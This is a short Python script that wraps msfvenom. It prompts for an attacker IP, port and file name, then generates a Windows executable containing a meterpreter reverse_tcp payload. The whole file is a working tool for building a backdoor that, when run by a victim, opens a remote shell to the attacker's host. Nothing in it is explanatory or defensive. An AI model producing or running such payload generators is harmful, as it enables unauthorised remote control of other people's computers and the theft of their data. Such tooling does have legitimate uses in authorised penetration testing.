import subprocess

def generate_payload():
    lhost = input("Enter LHOST IP address: ")
    lport = input("Enter LPORT port: ")
    output_name = input("Enter output file name (without extension): ")

    output_file = output_name + ".exe"
    
    print(f"Generating payload with LHOST={lhost}, LPORT={lport}, and saving as {output_file}...")
    
    # Constructing the msfvenom command
    msfvenom_command = [
        "msfvenom",
        "-p", "windows/meterpreter/reverse_tcp",
        "-a", "x86",
        "--platform", "windows",
        "-f", "exe",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-o", output_file
    ]
    
    # Running the msfvenom command
    subprocess.run(msfvenom_command)

def main():
    generate_payload()

if __name__ == "__main__":
    main()
